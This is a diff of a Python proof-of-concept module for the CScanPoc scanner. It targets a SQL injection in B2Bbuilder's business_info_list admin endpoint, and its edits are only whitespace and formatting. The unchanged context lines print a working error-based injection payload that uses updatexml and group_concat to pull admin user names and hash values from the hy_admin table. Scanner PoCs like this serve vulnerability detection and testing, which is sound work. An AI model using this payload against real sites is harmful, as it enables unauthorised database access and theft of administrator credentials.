@@ -3,11 +3,12 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
-    vuln_id = 'B2Bbuilder_0011' # 平台漏洞编号，留空
+    vuln_id = 'B2Bbuilder_0011'  # 平台漏洞编号，留空
     name = 'B2Bbuilder sql注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2015-05-18'  # 漏洞公布时间
     desc = '''
         module\company\admin\business_info_list.php
@@ -32,7 +33,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/main.php?m=company&s=admin/business_info_list'
             data = "del[]=1) or updatexml(2,concat(0x7e,((select group_concat(user,0x5e,md5(c)) from hy_admin))),0) %23&updateID=11&cc=6750"
             url = self.target + payload
@@ -47,6 +48,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
